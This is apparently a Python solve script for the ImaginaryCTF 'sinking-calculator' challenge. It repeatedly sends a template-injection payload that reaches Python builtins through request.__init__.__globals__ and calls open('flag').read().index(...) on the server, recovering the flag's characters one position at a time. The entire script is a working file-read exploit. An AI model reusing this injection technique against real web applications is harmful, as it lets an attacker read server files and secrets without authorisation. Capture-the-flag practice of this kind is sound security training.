import requests

keyspace = '{}_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789'

flaglst = [None] * 115
for i in keyspace:
    counter = 1
    try:
        while counter < 116:
            resp = requests.get("https://sinking-calculator.chal.imaginaryctf.org/calc?query=request.__init__.__globals__.__builtins__.open('flag').read().index('%s',%s)" % (i, counter))

            if "-1" not in resp.text:
                counter = int(resp.text)
                print("%s is at position %s" % (i, counter))
                flaglst[counter] = i
                counter = int(resp.text) + 1
    except:
        counter = 1
        continue
print(flaglst)